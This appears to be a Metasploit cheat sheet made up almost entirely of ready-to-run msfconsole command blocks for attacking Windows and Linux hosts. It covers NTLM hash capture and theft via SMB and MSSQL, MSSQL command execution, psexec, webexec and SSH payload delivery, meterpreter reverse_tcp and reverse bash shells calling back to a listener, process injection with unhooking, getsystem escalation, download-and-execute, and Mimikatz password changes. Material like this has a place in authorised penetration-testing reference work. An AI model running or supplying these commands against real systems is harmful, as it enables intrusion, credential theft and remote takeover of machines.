# Start capturing NTLMv2 over SMB
```ruby
use auxiliary/server/capture/smb
set VERBOSE true
run
```

# Start capturing all supported protocols
```ruby
load capture
captureg start --ip <ip>
```

# Enumerate SMB shares
## Options
```ruby
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <ip>
set SMBUser Guest
set ShowFiles true
set SpiderShares true
```

## Run
```ruby
 run -o ShowFiles=true,SpiderShares=true smb://guest@<ip>
```

# Download a file over SMB
## Options
```ruby
use auxiliary/admin/smb/download_file
set RHOSTS <ip>
set SMBUser Guest
set SMBSHARE "<share>"
set RPATH "\<path>\file"
```

## Run
```ruby
use auxiliary/admin/smb/download_file
run smb://guest@<ip>/<share>/<path>/<file>
# run smb://<user>:<password>@<ip>/<share>/<path>/<file>
```

# MSSQL Login 
## Options
```ruby
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set USE_WINDOWS_AUTHENT <true>
```

## Run
```ruby
use auxiliary/scanner/mssql/mssql_login
run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port> <ip>
``

# Microsoft SQL Server command execution
## Options
```ruby
use auxiliary/admin/mssql/mssql_exec
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set USE_WINDOWS_AUTHENT <true>
set CMD <whoami>
```

## Run
```ruby
use auxiliary/admin/mssql/mssql_exec
run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,CMD=<whoami> <ip>
```

# Microsoft SQL Server NTLM stealer
## Options
```ruby
use auxiliary/server/capture/smb
run
use admin/mssql/mssql_ntlm_stealer
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set SMBPROXY <ip_of_smb_sniffer>
set USE_WINDOWS_AUTHENT <true>
run
```

## Run
```ruby
use auxiliary/server/capture/smb
run
use admin/mssql/mssql_ntlm_stealer
run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SMBPROXY=<ip_of_smb_sniffer> <ip>
```

#  Microsoft SQL Server payload execution
## Options
```ruby
use exploit/windows/mssql/mssql_payload
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set USE_WINDOWS_AUTHENT <true>
set SRVHOST <handler_listen_ip>
set SRVPORT <handler_listen_port>
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
```

## Run
```ruby
use exploit/windows/mssql/mssql_payload
run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port> <ip>
```

# Spawn a new process and migrate to it
```ruby
use post/windows/manage/migrate
set session <1>
run
```

# Spawn new processes and initiate new meterpreter sessions
## Options
```ruby
use post/windows/manage/multi_meterpreter_inject
set AMOUNT <2>
set HANDLER <true>
set SESSION <1>
set IPLIST <payload_connect_to_ips>
set LPORT <payload_connect_to_port>
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## Run
```ruby
use post/windows/manage/multi_meterpreter_inject
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
run AMOUNT=<2>,HANDLER=<true>,SESSION=<1>,IPLIST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port> <ip>
```

# Spawn a new process and initiate a new meterpreter session from it
## Options
```ruby
use exploit/windows/local/payload_inject
set AUTOUNHOOK <true>
set SESSION <1>
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
```

## Options with a custom payload
```ruby
use exploit/windows/local/payload_inject
set AUTOUNHOOK <true>
set SESSION <1>
set PAYLOAD windows/meterpreter/reverse_tcp_rc4
set RC4PASSWORD <random_password> # head -10 /dev/random | sha256sum
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
```

## Run
```ruby
run -o AUTOUNHOOK=<true>,SESSION=<1>,LHOST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port>
```

## Run with a custom payload
```ruby
run -o AUTOUNHOOK=<true>,SESSION=<1>,LHOST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port>,PAYLOAD='windows/meterpreter/reverse_tcp_rc4',RC4PASSWORD=<random_password>
```

# Get system
## Meterpreter
```ruby
# Per 2022-10-19
#    -t   The technique to use. (Default to '0').
#                0 : All techniques available
#                1 : Named Pipe Impersonation (In Memory/Admin)
#                2 : Named Pipe Impersonation (Dropper/Admin)
#                3 : Token Duplication (In Memory/Admin)
#                4 : Named Pipe Impersonation (RPCSS variant)
#                5 : Named Pipe Impersonation (PrintSpooler variant)
#                6 : Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
getsystem -t <6>
```

## Options
```ruby
use post/windows/escalate/getsystem
set SESSION <1>
set TECHNIQUE <6>
```

## msfconsole
```ruby
sessions -C "getsystem -t 6" -i 14
```

# Run
```ruby
use post/windows/escalate/getsystem
run -o SESSION=<1>,TECHNIQUE=<6>
```

# Migrate between architectures
## session
```ruby
session -u <3>
```

## archmigrate
```ruby
use post/windows/manage/archmigrate
set SESSION <1>
```

## shell_to_meterpreter
```ruby
use post/multi/manage/shell_to_meterpreter
run -o LHOST=<tun0>,LPORT=<10003>,SESSION=<1>
```

# Execute applications over SMB
## psexec
### Options
```ruby
use exploit/windows/smb/psexec
set RHOSTS <ip>
set SMBPass <password>
set SMBUser <user>
set SMBDomain <domain>
set SRVHOST <handler_listen_ip>
set SRVPORT <handler_listen_port>
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
```
### Run
```ruby
use exploit/windows/smb/psexec
run -o SMBPass=<password>,SMBUser=<user>,SMBDomain=<domain>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port> <ip>
```

## webexec
### Options
```ruby
use exploit/windows/smb/webexec
set RHOSTS <ip>
set SMBPass <password>
set SMBUser <user>
set SMBDomain <domain>
set SRVHOST <handler_listen_ip>
set SRVPORT <handler_listen_port>
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
```

### Run
```ruby
use exploit/windows/smb/webexec
run -o SMBPass=<password>,SMBUser=<user>,SMBDomain=<domain>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port> <ip>
```

# Change password
## Options
```ruby
use post/windows/manage/change_password
set OLD_PASSWORD <old_password>
set NEW_PASSWORD <new_password>
set SESSION <1>
set SMBDomain <domain>
set SMBUser <user>
```
## Run
```ruby
use post/windows/manage/change_password
run -o OLD_PASSWORD=<old_password>,NEW_PASSWORD=<new_password>,SESSION=<1>,SMBDomain=<domain>,SMBUser=<user>
```

# Local exploit suggester
```ruby
use post/multi/recon/local_exploit_suggester
run SESSION=<1>
```

# Execute commands via Windows Management Instrumentation (WMI)
```ruby
use exploit/windows/local/wmi
# run -o LHOST=<payload_connect_to_ip>,SESSION=<1> <127.0.0.1>
# run -o LHOST=<payload_connect_to_ip>,SESSION=<1> <remote_ip_of_session>
# run -o LHOST=<payload_connect_to_ip>,SESSION=<1>,SMBDomain=<domain>,SMBUser=<user>,SMBPass=<password> <remote_ip_from_session>
```

# Run metasploit commands from provided files
```ruby
resource <path_to_resource_file_1> <path_to_resource_file_2>
```

# Run shell/system commands from a provided file
```ruby
use post/multi/gather/multi_command
run SESSION=<1>,RESOURCE=<path_to_file>
```

# Browse the session filesystem in a web browser
```ruby
use post/multi/manage/fileshare
run -o SESSION=<1>,URIPATH=<random>
# open http://127.0.0.1:8080/<random>/C:
````

# Upload and execute an executable from localhost
## Options
```ruby
use post/multi/manage/upload_exec
set session <1>
set LPATH '<path_to_local_file>'
set RPATH '<path_to_remote_file>'
set ARGS '<args>'
```

## Run
```ruby
use post/multi/manage/upload_exec
run -o LPATH='<path_to_local_file>',RPATH='<path_to_remote_file>',SESSION=<1>
```

# Download and/or execute
## Run
```ruby
use post/windows/manage/download_exec
run SESSION=2,URL='<url_to_exe>',EXECUTE=<true>
```

# SSH user code execution
## Options
```ruby
use exploit/multi/ssh/sshexec
set TARGET 1
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set SRVHOST <handler_listen_ip>
set SRVPORT <handler_listen_port>
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
set RHOSTS <ip>
set USERNAME <username>
set PASSWORD <password>
```

## Run
```ruby
use exploit/multi/ssh/sshexec
run -o TARGET=1,PAYLOAD=linux/x64/meterpreter/reverse_tcp,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port>,RHOSTS=<ip>,USERNAME=<username>,PASSWORD=<password> <ip>
```

# Reverse BASH
```ruby
handler -p cmd/unix/reverse_bash -H <tun0> -P <10000>
use payload/cmd/unix/reverse_bash
generate -f raw LHOST=<tun0> LPORT=<10000>
```

# Mimikatz
## Meterpreter
### Change password
```ruby
load kiwi
password_change -n <NTLM> -P <new_password> -u <user> -s <host>
```
